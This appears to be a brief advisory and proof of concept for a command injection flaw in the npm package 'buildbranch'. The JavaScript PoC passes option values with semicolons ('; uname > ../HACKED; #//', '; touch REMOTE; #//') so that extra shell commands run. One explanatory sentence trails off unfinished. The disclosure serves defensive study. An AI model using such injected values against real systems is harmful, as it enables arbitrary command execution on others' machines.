# Overview

buildbranch is a package to publish a folder to the given build branch (like gh-pages). 
Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the key values, using ` options.branch` in `buildBranch`.
Since the packages clears the `package.json` and the `poc.js`, touch the file somewhere other than current 

# Proof of Concept

```js
var buildBranch = require('buildbranch');
buildBranch(
    {
    branch: "; uname > ../HACKED; #//",
    remote: "; touch REMOTE; #//",
    ignore: ['.git', 'www', 'node_modules'],
    folder: "; touch FOLDER; #//",
    domain: "; touch DOMAIN; #//",
    noVerify: false
  }, function(err) {
    if(err) {
      throw err;
    }
    console.log('done!');
  }
);
```
